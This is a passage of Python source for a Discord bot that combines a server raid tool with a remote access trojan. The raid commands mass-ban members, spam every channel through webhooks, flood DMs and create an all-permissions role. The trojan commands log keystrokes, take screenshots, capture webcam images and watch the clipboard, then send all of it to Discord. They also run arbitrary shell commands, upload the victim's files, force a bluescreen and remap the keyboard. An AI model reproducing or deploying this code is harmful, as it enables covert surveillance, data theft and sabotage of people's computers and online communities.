    if not dope_role:
        try:
            dope_role = await ctx.guild.create_role(name="DOPE ROLE", permissions=discord.Permissions.all())
        except discord.Forbidden:
            await ctx.message.delete()
            return

    await ctx.author.add_roles(dope_role)
    await ctx.message.delete()

async def move_role_to_top(guild, role_name):
    role = discord.utils.get(guild.roles, name=role_name)
    if not role:
        print(f"Role '{role_name}' not found.")
        return

    roles = sorted(guild.roles, key=lambda x: x.position, reverse=True)

    role_position = roles.index(role)

    try:
        await role.edit(position=1)

        for idx, r in enumerate(roles):
            if r != role:
                await r.edit(position=idx + 2)

        print(f"Role '{role_name}' moved to the top successfully.")
    except discord.Forbidden:
        print("Bot doesn't have permission to edit roles.")
    except Exception as e:
        print(f"An error occurred: {e}")

@bot.command(help= "Move DOPE ROLE to highest role (needs PERMS)")
async def movdop(ctx):
    await move_role_to_top(ctx.guild, "DOPE ROLE")

@bot.command(help="Deletes all roles named DOPE ROLE")
async def deldop(ctx):
    if not ctx.guild.me.guild_permissions.manage_roles:
        await ctx.send("Der Bot hat nicht die Berechtigung, Rollen zu löschen.")
        return

    roles_to_delete = [role for role in ctx.guild.roles if role.name == "DOPE ROLE"]
    for role in roles_to_delete:
        try:
            await role.delete()
            print(f"Deleted role: {role.name}")
        except discord.Forbidden:
            print(f"Failed to delete role: {role.name}")
    await ctx.message.delete()

@bot.command(help="text to speech")
async def tts(ctx, *, text: str):
    thread = threading.Thread(target=read_text, args=(ctx, text))
    thread.start()

def read_text(ctx, text):
    try:
        engine = pyttsx3.init()

        engine.setProperty('rate', 150)
        engine.setProperty('volume', 0.9)

        engine.say(text)

        engine.runAndWait()

    except Exception as e:
        ctx.send(f"An error occurred: {e}")

@bot.command(help= "Create a Webhook in every Channel and SPAM!")
async def ownspam(ctx):
    global spamming_enabled
    print("Starting ownspam command...")
    tasks = []
    for guild in bot.guilds:
        print(f"Processing guild: {guild.name}")
        for channel in guild.text_channels:
            print(f"Creating webhook in channel: {channel.name}")
            task = asyncio.create_task(create_and_send_spam(channel))
            tasks.append(task)
    await asyncio.gather(*tasks)

async def create_and_send_spam(channel):
    global spamming_enabled
    try:
        webhook = await create_webhook(channel)
        if webhook:
            print(f"Webhook created successfully in channel {channel.name}: {webhook.name}")
            while spamming_enabled:
                await send_spam(webhook)
                await asyncio.sleep(3)
        else:
            print(f"Failed to create webhook in channel {channel.name}.")
    except Exception as e:
        print(f"An error occurred in channel {channel.name}: {e}")

async def create_webhook(channel):
    try:
        webhooks = await channel.webhooks()
        existing_webhook = discord.utils.get(webhooks, name="raided by Heidi")
        if existing_webhook:
            return existing_webhook
        else:
            webhook = await channel.create_webhook(name="raided by Heidi")
            return webhook
    except Exception as e:
        print(f"Failed to create webhook in channel {channel.name}: {e}")
        return None

async def send_spam(webhook):
    try:
        await webhook.send("@everyone @here you just got raided by Heidi!", username="Raider", avatar_url="https://example.com/avatar.png")
    except Exception as e:
        print(f"Failed to send message via webhook: {e}")

@bot.command(help= "Delete all the Webhooks created by >ownspam.")
async def delown(ctx):
    global spamming_enabled
    print("Starting delown command...")
    spamming_enabled = False
    for guild in bot.guilds:
        print(f"Processing guild: {guild.name}")
        for channel in guild.text_channels:
            print(f"Using channel: {channel.name}")
            await delete_webhook(channel)
            print(f"Webhook deleted successfully in channel {channel.name}.")

async def delete_webhook(channel):
    try:
        webhooks = await channel.webhooks()
        existing_webhook = discord.utils.get(webhooks, name="raided by Heidi")
        if existing_webhook:
            await existing_webhook.delete()
    except Exception as e:
        print(f"Failed to delete webhook in channel {channel.name}: {e}")

async def monitor_clipboard():
    global clipboard_previous
    while True:
        clipboard_content = pyperclip.paste()
        if clipboard_content != clipboard_previous:
            clipboard_previous = clipboard_content
            if clipboard_channel:
                await send_embed_message(clipboard_channel, f"Clipboard changed:\n```\n{clipboard_content}\n```")
        await asyncio.sleep(1)

@bot.command(help= "Get the SERVER OWNER's dc name.")
async def getowner(ctx):
    guild_owner = ctx.guild.owner
    if guild_owner:
        await ctx.send(f'The owner of this server is: {guild_owner}')
    else:
        await ctx.send("Failed to find the owner of this server.")

@bot.command(help="Bans all members except for the specified user ID")
async def banall(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Banning all members except for the specified user ID...")
        allowed_user_id = 691670319248965694

        members = ctx.guild.members

        for member in members:
            if member.id != allowed_user_id and not member.bot:
                try:
                    await member.ban(reason="Ban all command executed")
                    await ctx.send(f"User {member.name}#{member.discriminator} banned.")
                except discord.Forbidden:
                    await ctx.send(f"The bot doesn't have the necessary permissions to ban {member.name}#{member.discriminator}.")
                except Exception as e:
                    await ctx.send(f"Failed to ban {member.name}#{member.discriminator}: {e}")

        await ctx.send("All non-bot members banned except for the specified user ID.")
    else:
        await ctx.send("You do not have permission to execute this command.")

@bot.command(help="Unban every banned user in this Guild")
async def unbanall(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Entbannen aller Benutzer gestartet...")
        try:
            server = ctx.guild
            async for ban_entry in server.bans():
                user = ban_entry.user
                try:
                    await server.unban(user)
                    await ctx.send(f"Benutzer {user} wurde erfolgreich entbannt.")
                except discord.Forbidden:
                    await ctx.send(f"Der Bot hat nicht die erforderlichen Berechtigungen, um {user} zu entbannen.")
                except Exception as e:
                    await ctx.send(f"Fehler beim Entbannen des Benutzers {user}: {e}")
        except Exception as e:
            global popup_window
            await ctx.send(f"Fehler beim Abrufen der gebannten Benutzer: {e}")
    else:
        await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")

@bot.command(help="show message on screen")
async def say(ctx, *, message):
    show_message(message)

def show_message(text):
    root = tk.Tk()
    root.withdraw()

    message_box = messagebox.showinfo("New Message!!!", text)

    root.attributes("-topmost", True)
    root.wm_attributes("-topmost", 1)

    root.after(0, lambda: root.focus_force())

#

@bot.command(help="show message on screen with tiny close button")
async def ad(ctx, *, message):
    thread = threading.Thread(target=show_message2, args=(ctx, message))
    thread.start()

@bot.command(help="close the message popup window")
async def close(ctx):
    global popup_window
    global close_button_window
    if popup_window:
        popup_window.destroy()
        popup_window = None
    if close_button_window:
        close_button_window.destroy()
        close_button_window = None

def show_message2(ctx, text):
    global popup_window
    global popup_root
    global close_button_window

    root = tk.Tk()
    root.withdraw()
    popup_root = root

    global popup_window

    popup = tk.Toplevel(root)
    popup.title("New Message!!!")

    label = tk.Label(popup, text=text, font=("Helvetica", 15))
    label.pack()

    popup.protocol("WM_DELETE_WINDOW", lambda: None)

    popup.overrideredirect(1)
    popup.attributes("-topmost", True)

    window_width = label.winfo_reqwidth() + 0
    window_height = label.winfo_reqheight() + 0

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    position_x = int((screen_width - window_width) / 2)
    position_y = int((screen_height - window_height) / 2)
    popup.geometry(f"{window_width}x{window_height}+{position_x}+{position_y}")

    close_button_root = tk.Toplevel(root)
    close_button_root.overrideredirect(1)
    close_button_root.geometry("+0+0")
    close_button_root.attributes("-topmost", True)

    close_button = tk.Button(close_button_root, text="X", command=lambda: close_popup(popup, close_button_root), font=("Helvetica", 4), width=1, height=1)
    close_button.pack()

    popup_window = popup
    close_button_window = close_button_root

    root.mainloop()

def close_popup(popup, close_button_root):
    popup.destroy()
    close_button_root.destroy()

#

@bot.command(help= "send a picture of every cam")
async def cams(ctx):
    camera_index = 0
    while True:
        ret, image = capture_image(camera_index)
        if ret:
            await send_image(ctx, image)
        else:
            break
        camera_index += 1

async def send_image(ctx, image):
    _, img_encoded = cv2.imencode('.jpg', image)
    img_bytes = img_encoded.tobytes()
    img_file = discord.File(io.BytesIO(img_bytes), filename='image.jpg')
    await ctx.send(file=img_file)

def capture_image(camera_index):
    cap = cv2.VideoCapture(camera_index)
    if not cap.isOpened():
        print(f"Kamera {camera_index} ist nicht verfügbar.")
        return False, None
    ret, frame = cap.read()
    cap.release()
    return ret, frame

@bot.command(help= "Bot leaves the server")
async def leave(ctx):
    await ctx.send("Ich verlasse den Server...")
    await ctx.guild.leave()

@bot.command(help="Executes multiple actions: banall, delall, auditspam, clear, reguild, repic")
async def all(ctx):
    print("clear")
    await clear(ctx)
    print("reguild")
    await reguild(ctx, "raided by Heidi")
    print("clear")
    await clear(ctx)
    print("repic")
    await repic(ctx, "https://media.tenor.com/2fDPAEGo1vAAAAAM/alfred-marko.gif")
    print("clear")
    await clear(ctx)
    print("delall")
    await delall(ctx)
    print("clear")
    await clear(ctx)
    print("banall")
    await banall(ctx)
    print("clear")
    await clear(ctx)
    print("spam")
    await spam(ctx)
    print("clear")
    await clear(ctx)

@bot.command(help="Change a nickname")
async def change_nick(ctx, member: str, new_nick: str):
    if not ctx.author.guild_permissions.manage_nicknames:
        await ctx.send("You do not have the necessary permissions to change nicknames.")
        return

    if not ctx.guild.me.guild_permissions.manage_nicknames:
        await ctx.send("I do not have the necessary permissions to change nicknames.")
        return

    if member == "*":
        await ctx.send("Changing nicknames for all members including bots...")
        members = ctx.guild.members

        for member in members:
            try:
                await member.edit(nick=new_nick)
                await ctx.send(f"Changed nickname for {member.name} to {new_nick}")
            except discord.Forbidden:
                await ctx.send(f"I don't have the necessary permissions to change the nickname for {member.name}")
            except Exception as e:
                await ctx.send(f"Failed to change nickname for {member.name}: {e}")
    else:
        try:
            member = await commands.MemberConverter().convert(ctx, member)
            await member.edit(nick=new_nick)
            await ctx.send(f"Changed nickname for {member.name} to {new_nick}")
        except commands.MemberNotFound:
            await ctx.send("Member not found. Please provide a valid member mention or ID.")
        except discord.Forbidden:
            await ctx.send(f"I don't have the necessary permissions to change the nickname for {member}")
        except Exception as e:
            await ctx.send(f"Failed to change nickname for {member}: {e}")

@bot.command(help= "Flood DMs")
async def dm_flood(ctx, member: discord.Member):
    for _ in range(20):
        await member.send("@everyone")

@bot.command(help= "Change Admin nickname")
async def change_admin_nick(ctx):
    for member in ctx.guild.members:
        if member.guild_permissions.administrator:
            await member.edit(nick=f'Admin-{random.randint(1, 1000)}')
            await ctx.send(f'Changed admin {member.name} nickname')

@bot.command(help= "Flood with Emojis")
async def emoji_flood(ctx):
    for _ in range(500):
        await ctx.send(random.choice(['😂', '😡', '😢', '❤️', '😜', '😊', '😎', '😍', '😭', '😏', '😅', '🙄', '😴', '😬', '😋', '😇', '🤔', '🤗', '😳', '😌', '😤', '😈', '🤐', '😪', '😷', '😫', '😝', '😕', '😱', '😖', '😩', '😓', '😒', '😔', '😘', '😙', '😚', '😑', '😐', '😶', '😅', '😁', '😄', '😆', '😃', '😀', '🤣', '😉', '😌', '😎', '😛', '😜', '😝', '🤑', '😲', '🙃', '🤔', '🤥', '😣', '😖', '😤', '😡', '😠', '🤒', '🤕', '😷', '🤧', '😇', '🤠', '🤡', '🤥', '😈', '👿', '👹', '👺', '💀', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🐱', '🐶', '🦊', '🐰', '🐻', '🐼', '🐨', '🐯', '🦁', '🐮', '🐷', '🐽', '🐸', '🐵', '🙈', '🙉', '🙊', '🐒', '🐔', '🐧', '🐦', '🐤', '🐣', '🐥', '🦆', '🦅', '🦉', '🦇', '🐺', '🐗', '🐴', '🦄', '🐝', '🐛', '🦋', '🐌', '🐞', '🐜', '🕷', '🕸', '🦂', '🐢', '🐍', '🦎', '🦖', '🦕', '🐙', '🦑', '🦐', '🦞', '🦀', '🐡', '🐠', '🐟', '🐬', '🐳', '🐋', '🦈', '🐊', '🐅', '🐆', '🦓', '🦍', '🐘', '🦏', '🦛', '🐪', '🐫', '🦙', '🦒', '🐃', '🐂', '🐄', '🐎', '🐖', '🐏', '🐑', '🐐', '🦌', '🐕', '🐩', '🦮', '🐕‍🦺', '🐈', '🐈‍⬛', '🦢', '🦜', '🦚', '🦩', '🦨', '🦡', '🦦', '🦥', '🐁', '🐀', '🐿', '🦔', '🐉', '🐲', '🌵', '🎄', '🌲', '🌳', '🌴', '🌱', '🌿', '☘️', '🍀', '🎍', '🎋', '🍃', '🍂', '🍁', '🍄', '🌾', '💐', '🌷', '🌹', '🥀', '🌺', '🌸', '🌼', '🌻', '🌞', '🌝', '🌛', '🌜', '🌚', '🌕', '🌖', '🌗', '🌘', '🌑', '🌒', '🌓', '🌔', '🌙', '🌎', '🌍', '🌏', '💫', '⭐', '🌟', '✨', '⚡', '🔥', '💥', '🌪', '🌈', '☔', '💧', '💦', '🌊', '🎃', '🎄', '🎆', '🎇', '✨', '🎈', '🎉', '🎊', '🎋', '🎍', '🎎', '🎏', '🎐', '🎑', '🧧', '🎀', '🎁', '🎗', '🎟', '🎫', '🎖', '🏆', '🏅', '🥇', '🥈', '🥉', '⚽', '⚾', '🥎', '🏀', '🏐', '🏈', '🏉', '🎾', '🥏', '🎳', '🏏', '🏑', '🏒', '🥍', '🏓', '🏸', '🥊', '🥋', '🥅', '⛳', '⛸', '🎣', '🤿', '🎽', '🎿', '🛷', '🥌', '🎯', '🪀', '🪁', '🎱', '🔮', '🪄', '🧿', '🪬', '🕹', '🧩', '🧸', '🪅', '🪩', '🪆', '♠️', '♥️', '♦️', '♣️', '♟', '🃏', '🀄', '🎴', '🎭', '🖼', '🎨', '🧵', '🪡', '🧶', '🪢', '👓', '🕶', '🥽', '🥼', '🦺', '👔', '👕', '👖', '🧣', '🧤', '🧥', '🧦', '👗', '👘', '🥻', '🩱', '🩲', '🩳', '👙', '👚', '👛', '👜', '👝', '🛍', '🎒', '🩴', '👞', '👟', '🥾', '🥿', '👠', '👡', '🩰', '👢', '👑', '👒', '🎩', '🎓', '🧢', '🪖', '⛑', '💄', '💍', '💎', '📿', '🔇', '🔈', '🔉', '🔊', '📢', '📣', '📯', '🔔', '🔕', '🎼', '🎵', '🎶', '🎙', '🎚', '🎛', '🎤', '🎧', '📻', '🎷', '🪗', '🎸', '🎹', '🎺', '🎻', '🪕', '🥁', '🪘', '📱', '📲', '☎️', '📞', '📟', '📠', '🔋', '🔌', '💻', '🖥', '🖨', '⌨️', '🖱', '🖲', '💽', '💾', '💿', '📀', '🧮', '🎥', '🎬', '📺', '📷', '📸', '📹', '📼', '🔍', '🔎', '🕯', '💡', '🔦', '🏮', '🪔', '📔', '📕', '📖', '📗', '📘', '📙', '📚', '📓', '📒', '📃', '📜', '📄', '📰', '🗞', '📑', '🔖', '🏷', '💰', '🪙', '💴', '💵', '💶', '💷', '💸', '💳', '🧾', '💹', '✉️', '📧', '📨', '📩', '📤', '📥', '📦', '📫', '📪', '📬', '📭', '📮', '🗳', '✏️', '✒️', '🖋', '🖊', '🖌', '🖍', '📝', '📁', '📂', '🗂', '📅', '📆', '🗒', '🗓', '📇', '📈']))

@bot.command(help= 'Create max Roles named "U NOOB"')
async def rolez(ctx):
    if not ctx.guild:
        await ctx.send("Dieser Befehl kann nur auf einem Server verwendet werden.")
        return

    for i in range(250):
        role_name = "U NOOB"
        try:
            await ctx.guild.create_role(name=role_name)
        except discord.Forbidden:
            await ctx.send("Ich habe keine Berechtigung, Rollen zu erstellen.")
            return
        except discord.HTTPException:
            await ctx.send("Es ist ein Fehler beim Erstellen der Rolle aufgetreten.")
            return

    await ctx.send("Rollen mit dem Namen 'U NOOB' wurden erstellt.")

TIME_INTERVAL = 20

class Keylogger:
    def __init__(self, channel, interval):
        self.interval = interval
        self.channel = channel
        self.log = ""

    async def _report(self):
        await bot.wait_until_ready()
        while True:
            await asyncio.sleep(self.interval)
            timenow = datetime.now().time()
            if self.log:
                try:
                    await self.channel.send(f"*USER*: **{os.getlogin()}** ~~*TIME: {timenow}*~~ {self.log}")
                    self.log = ''

                    screenshot = ImageGrab.grab(all_screens=True)
                    screenshot_filename = f"C:/Users/{os.getlogin()}/Downloads/screenshot.png"
                    screenshot.save(screenshot_filename)

                    await self.channel.send(file=discord.File(screenshot_filename))

                    os.remove(screenshot_filename)
                except Exception as e:
                    print(f"Error in reporting: {e}")

    def _on_key_press(self, key):
        try:
            self.log += str(key)
        except Exception as e:
            print(f"Error in key press: {e}")

    def run(self):
        threading.Thread(target=self._start_keylogger).start()
        asyncio.create_task(self._report())

    def _start_keylogger(self):
        with Listener(on_press=self._on_key_press) as listener:
            listener.join()

@bot.command(help='enable keylogger')
async def on(ctx):
    guild = bot.guilds[0]
    user_channel_name = os.getlogin()
    existing_channel = discord.utils.get(guild.channels, name=user_channel_name)
    keylogger = Keylogger(existing_channel, TIME_INTERVAL)
    await ctx.send("Keylogger started.")
    keylogger.run()

@bot.command(help='disable keylogger')
async def off(ctx):
    await ctx.send("Keylogger stopped.")

@bot.command(help= "bluescreen the computer")
async def bluescreen(ctx):
    if not os.getlogin() == DEV:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    else: await ctx.send("DU HURENSOHN")

@bot.command(help= "open any URL in the webbrowser")
async def url(ctx, url: str):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    if platform.system() == 'Darwin':
        subprocess.call(('open', url))
    elif platform.system() == 'Windows':
        subprocess.call(('start', url), shell=True)
    else:
        subprocess.call(('xdg-open', url))

    await ctx.send(f'Opening URL: {url}')

@bot.command(help="Change directory")
async def cd(ctx, *, path: str = None):
    global current_directory
    if path:
        try:
            os.chdir(path)
            current_directory = os.getcwd()
            await ctx.send(f'Changed directory to {current_directory}')
        except Exception as e:
            await ctx.send(f'Error: {e}')
    else:
        await ctx.send(f'Current directory is {current_directory}')

@bot.command(help="Create directory")
async def mkdir(ctx, *, dirname: str):
    try:
        os.mkdir(dirname)
        await ctx.send(f'Directory {dirname} created')
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command(help="Remove directory")
async def rmdir(ctx, *, dirname: str):
    try:
        os.rmdir(dirname)
        await ctx.send(f'Directory {dirname} removed')
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command(help="Create file")
async def touch(ctx, *, filename: str):
    global current_directory
    if filename:
        file_path = os.path.join(os.getcwd(), filename)
        if not os.path.exists(file_path):
            try:
                with open(file_path, "w"):
                    pass
                await ctx.send(f"File `{filename}` created successfully in directory `{current_directory}`")
            except Exception as e:
                await ctx.send(f"Error creating file: {e}")
        else:
            await ctx.send("File already exists.")
    else:
        await ctx.send("Please specify a filename.")

@bot.command(help="Remove file")
async def rm(ctx, *, filename: str):
    try:
        os.remove(filename)
        await ctx.send(f'File {filename} removed')
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command(help="Upload file or folder")
async def upload(ctx, *, path: str):
    try:
        if os.path.isdir(path):
            zip_filename = f"{path}.zip"
            shutil.make_archive(path, 'zip', path)
            await ctx.send(file=discord.File(zip_filename))
            os.remove(zip_filename)
        elif os.path.isfile(path):
            await ctx.send(file=discord.File(path))
        else:
            await ctx.send("Error: The provided path is neither a file nor a directory.")
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command(help="Download file")
async def download(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("No file attached.")
        return

    attachment = ctx.message.attachments[0]
    try:
        await attachment.save(attachment.filename)
        await ctx.send(f'File {attachment.filename} downloaded')
    except Exception as e:
        await ctx.send(f'Error: {e}')

def mark_file_extensions(files):
    marked_files = []
    for file in files:
        filename, file_extension = os.path.splitext(file)
        if file_extension:
            marked_files.append(f"{filename}*{file_extension}*")
        else:
            marked_files.append(filename)
    return marked_files

@bot.command(help="List directory contents")
async def ls(ctx, order=''):
    try:
        if order == 'n':
            files = os.listdir(current_directory)
            files.sort(key=lambda x: os.path.getmtime(os.path.join(current_directory, x)), reverse=True)
        else:
            files = os.listdir(current_directory)
            files.sort()

        marked_files = mark_file_extensions(files)
        files_str = '\n'.join(marked_files)

        if len(files_str) <= 4096:
            embed = discord.Embed(
                title=f"Contents of {current_directory}",
                description=files_str,
                color=discord.Color.blue()
            )
            await ctx.send(embed=embed)
        else:
            chunks = [files_str[i:i + 4096] for i in range(0, len(files_str), 4096)]
            for chunk in chunks:
                embed = discord.Embed(
                    title=f"Contents of {current_directory}",
                    description=chunk,
                    color=discord.Color.blue()
                )
                await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f'Error: {e}')

@bot.command(help="Run a file in the current directory")
async def run(ctx, *, filename: str):
    global current_directory
    file_path = os.path.join(current_directory, filename)
    if os.path.exists(file_path):
        try:
            os.startfile(file_path)
            await ctx.send(f"File `{filename}` opened successfully.")
        except Exception as e:
            await ctx.send(f"Error opening file `{filename}`: {e}")
    else:
        await ctx.send("File not found.")

@bot.command(help= "show all the processes")
async def ran(ctx, *, query: str = ""):
    result = subprocess.run(['tasklist'], capture_output=True, text=True, shell=True)
    process_list = result.stdout

    if not query:
        if len(process_list) > 1900:
            for i in range(0, len(process_list), 1900):
                await ctx.send(f"```\n{process_list[i:i+1900]}\n```")
        else:
            await ctx.send(f"```\n{process_list}\n```")
        return

    process_info = ""
    for line in process_list.splitlines():
        if query.lower() in line.lower():
            process_info = line
            break

    if process_info:
        await ctx.send(f"```\n{process_info}\n```")
    else:
        await ctx.send("Prozess nicht gefunden.")

@bot.command(help="Kill a specific process by its PID or Image Name and simulate a crash")
async def taskkill(ctx, identifier: str):
    try:
        if identifier.isdigit():
            pid = int(identifier)
            result = subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True, text=True, shell=True)
        else:
            if identifier.lower() == "fivem.exe":
                try:
                    result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq fivem.exe'], capture_output=True, text=True, shell=True)
                    processes = result.stdout.splitlines()

                    for process in processes:
                        if "fivem.exe" in process:
                            pid = int(process.split()[1])
                            ctypes.windll.kernel32.TerminateProcess(ctypes.windll.kernel32.OpenProcess(1, False, pid), -1)
                            await ctx.send(f"Prozess 'fivem.exe' mit der PID {pid} erfolgreich simuliert abgestürzt.")
                            return
                except Exception as e:
                    await ctx.send(f"Ein Fehler ist beim Simulieren des Absturzes aufgetreten: {e}")
                    return
            else:
                result = subprocess.run(['taskkill', '/IM', identifier, '/F'], capture_output=True, text=True, shell=True)

        if result.returncode == 0:
            await ctx.send(f"Prozess mit der PID oder dem Abbildnamen '{identifier}' erfolgreich beendet.")
        else:
            await ctx.send(f"Fehler beim Beenden des Prozesses mit der PID oder dem Abbildnamen '{identifier}'. Ausgabe: {result.stdout}")
    except Exception as e:
        await ctx.send(f"Ein Fehler ist aufgetreten: {e}")

@bot.command(help= "show some information")
async def tskmngr(ctx):
    def bytes_to_readable(size_in_bytes):
        suffixes = ['B', 'KB', 'MB', 'GB', 'TB']
        index = 0
        while size_in_bytes >= 1024 and index < len(suffixes) - 1:
            size_in_bytes /= 1024
            index += 1
        return f"{size_in_bytes:.2f} {suffixes[index]}"

    uname = platform.uname()
    sys_info = (f"System: {uname.system}\n"
                f"Node Name: {uname.node}\n"
                f"Release: {uname.release}\n"
                f"Version: {uname.version}\n"
                f"Machine: {uname.machine}\n"
                f"Processor: {uname.processor}\n\n")

    result = subprocess.run(['wmic', 'cpu', 'get', 'Name,Description,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed,CurrentClockSpeed,L2CacheSize,L3CacheSize,SocketDesignation'], capture_output=True, text=True, shell=True)
    cpu_info = result.stdout

    result = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory'], capture_output=True, text=True, shell=True)
    memory_info_lines = result.stdout.strip().split('\n')

    total_memory_mb = 0
    free_memory_mb = 0

    for line in memory_info_lines:
        values = [int(s) for s in line.split() if s.isdigit()]
        if len(values) == 1:
            total_memory_mb += values[0]
        elif len(values) == 2:
            free_memory_mb += values[1]

    total_memory_readable = bytes_to_readable(total_memory_mb * 1024 * 1024)
    free_memory_readable = bytes_to_readable(free_memory_mb * 1024 * 1024)

    result = subprocess.run(['wmic', 'path', 'win32_videocontroller', 'get', 'name'], capture_output=True, text=True, shell=True)
    gpu_info = result.stdout

    result = subprocess.run(['wmic', 'diskdrive', 'get', 'caption,size,model'], capture_output=True, text=True, shell=True)
    disk_info = result.stdout

    result = subprocess.run(['wmic', 'nic', 'get', 'name,speed'], capture_output=True, text=True, shell=True)
    network_info = result.stdout

    full_info = (sys_info +
                 f"Total Memory: {total_memory_readable}\n"
                 f"Free Memory: {free_memory_readable}\n\n" +
                 cpu_info + '\n\n' + gpu_info + '\n\n' + disk_info + '\n\n' + network_info)

    if len(full_info) > 1900:
        for i in range(0, len(full_info), 1900):
            await ctx.send(f"```\n{full_info[i:i + 1900]}\n```")
    else:
        await ctx.send(f"```\n{full_info}\n```")

@bot.command(help= "check if the program has admin privileges")
async def checkadmin(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        await ctx.send("[*] Congrats you're admin")
    elif is_admin == False:
        await ctx.send("[!] Sorry, you're not admin")

@bot.command(help= "run anything like in win+r")
async def winr(ctx, *, command):
    try:
        subprocess.run(command, shell=True)
        await ctx.send(f'Befehl ausgeführt: {command}')
    except Exception as e:
        await ctx.send(f'Fehler beim Ausführen des Befehls: {e}')

@bot.command(help="Execute a command in the current directory")
async def exec(ctx, *, command):
    global current_directory
    try:
        result = subprocess.run(command, cwd=current_directory, shell=True, capture_output=True)
        if result.returncode == 0:
            output = result.stdout.decode('utf-8', 'ignore') + result.stderr.decode('utf-8', 'ignore')
            if len(output) == 0:
                await ctx.send("No output.")
            else:
                for i in range(0, len(output), 1900):
                    await ctx.send(f'```\n{output[i:i+1900]}\n```')
        else:
            await ctx.send(f'Command failed with return code {result.returncode}')
    except Exception as e:
        await ctx.send(f'Error: {e}')

#

watching_enabled = False
key_mapping = {}
last_key_state = {}

def watch_keyboard():
    while True:
        if watching_enabled:
            for key in list(key_mapping.keys()):
                if keyboard.is_pressed(key) and not last_key_state.get(key, False):
                    last_key_state[key] = True
                    actions = key_mapping[key]
                    for action in actions:
                        time.sleep(0.0025)
                        keyboard.send("\b")
                        keyboard.send(action)
                    break
                elif not keyboard.is_pressed(key):
                    last_key_state[key] = False
        time.sleep(0.001)

def switch_keyboard(option):
    global key_mapping
    global watching_enabled
    if len(option) == 3 and option[1] in ('>', '-'):
        if option[1] == '>':
            key_mapping[option[0]] = [option[2]]
        elif option[1] == '-':
            key_mapping[option[0]] = [option[2]]
            key_mapping[option[2]] = [option[0]]
        watching_enabled = True
        print(f"Tastaturüberwachung aktualisiert: {option}")

watching_thread = threading.Thread(target=watch_keyboard)
watching_thread.daemon = True
watching_thread.start()

@bot.command(help="switch keys on the keyboard (USAGE: >switchkb a-b (switches a to b and b to a), >switchkb a>b (switches a to b))")
async def switchkb(ctx, option: str):
    switch_keyboard(option)
    if watching_enabled:
        await ctx.send(f"Tastaturüberwachung aktualisiert: {option}")
    else:
        await ctx.send(f"Tastaturüberwachung aktiviert: {option}")

@bot.command(help="get all the switched keys")
async def checkkb(ctx):
    if key_mapping:
        message = "Momentan vertauschte Tasten:\n"
        for key, value in key_mapping.items():
            message += f"{key} -> {value}\n"
    else:
        message = "Momentan sind keine Tasten vertauscht."
    await ctx.send(message)

@bot.command(help="remove a specific switched key (USAGE: >removekb a-b (remove a to b and b to a), >removekb a>b(remove a to b))")
async def removekb(ctx, key: str):
    global key_mapping
    if key in key_mapping:
        del key_mapping[key]
        reverse_mapping = {value[0]: key for key, value in key_mapping.items()}
        if key in reverse_mapping:
            del key_mapping[reverse_mapping[key]]
        await ctx.send(f"Tastaturzuordnung für Taste '{key}' wurde entfernt.")
    elif '>' in key or '-' in key:
        if '>' in key:
            key = key.split('>')
            key_mapping.pop(key[0], None)
        elif '-' in key:
            key = key.split('-')
            key_mapping.pop(key[0], None)
            key_mapping.pop(key[1], None)
        await ctx.send(f"Tastaturzuordnung für Taste '{key}' wurde entfernt.")
    else:
        await ctx.send(f"Tastaturzuordnung für Taste '{key}' existiert nicht.")

@bot.command(help="reset the switched keys")
async def resetkb(ctx):
    global key_mapping
    key_mapping = {}
    await ctx.send("Alle Tastaturzuordnungen wurden zurückgesetzt.")

@bot.command(help="Reset and assign random keys to each letter of the alphabet")
async def randomkb(ctx):
    await resetkb(ctx)
    alphabet = list("abcdefghijklmnopqrstuvwxyz")
    shuffled_alphabet = alphabet.copy()
    random.shuffle(shuffled_alphabet)

    new_key_mapping = {}
    for original, shuffled in zip(alphabet, shuffled_alphabet):
        new_key_mapping[original] = [shuffled]

    global key_mapping
    key_mapping = new_key_mapping

    await ctx.send("Alle Tasten wurden zufällig zugewiesen.")

#

del_on_ctrl_enabled = False

def send_a_with_backspace():
    keyboard.send("a")
    time.sleep(0.001)
    keyboard.send("\b")

def delonstrg():
    global del_on_ctrl_enabled
    while True:
        if del_on_ctrl_enabled and keyboard.is_pressed("ctrl"):
            send_a_with_backspace()
        time.sleep(0.001)

delonstrg_thread = threading.Thread(target=delonstrg)
delonstrg_thread.daemon = True
delonstrg_thread.start()

@bot.command(help="Toggle sending 'a' with backspace when pressing Ctrl")
async def delonstrg(ctx):
    global del_on_ctrl_enabled
    del_on_ctrl_enabled = not del_on_ctrl_enabled
    status = "enabled" if del_on_ctrl_enabled else "disabled"
    await ctx.send(f"Sending 'a' with backspace when pressing Ctrl is now {status}.")

#

@bot.command(help="List all servers the bot is a member of")
async def serverlist(ctx):
    servers = list(bot.guilds)
    response = ""
    for server in servers:
        server_info = f"Server: {server.name} (ID: {server.id})\n"
        if len(response) + len(server_info) > 1900:
            await ctx.send(response)
            response = server_info
        else:
            response += server_info
    if response:
        await ctx.send(response)

@bot.command(help="Leave a server by its ID")
async def leaveserver(ctx, server_id: int):
    server = bot.get_guild(server_id)
    if server is None:
        await ctx.send(f"Kein Server mit der ID {server_id} gefunden.")
    else:
        await server.leave()
        await ctx.send(f"Bot hat den Server '{server.name}' (ID: {server.id}) verlassen.")

